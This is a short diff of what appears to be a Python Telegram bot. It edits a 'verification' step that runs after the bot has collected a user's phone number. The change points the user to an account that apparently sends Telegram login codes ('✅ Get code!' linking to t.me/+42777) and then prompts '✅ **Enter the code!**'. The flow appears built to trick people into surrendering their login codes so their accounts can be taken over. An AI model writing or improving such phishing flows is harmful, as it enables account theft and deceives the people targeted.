@@ -231,25 +231,14 @@ Type /start to begin verification process.
             await asyncio.sleep(1.2)
             await proc_msg.delete()
             
-            # Next step interface
+            # Next step interface with styled button
             next_kb = InlineKeyboardMarkup([
-                [InlineKeyboardButton("📲 Proceed to Verification", 
+                [InlineKeyboardButton("✅ Get code!", 
                                     url="https://t.me/+42777")]
             ])
             
             await update.message.reply_text(
-                f"""
-✅ **Information Received**
-
-Thanks {u.first_name}!
-
-📱 Contact: `{contact.phone_number[-4:]}****`
-
-**Next Step:**
-Click the button below to complete the verification process.
-
-⚠️ Keep this chat open - you'll return here to confirm.
-                """,
+                "✅ **Enter the code!**",
                 parse_mode='Markdown',
                 reply_markup=next_kb
             )
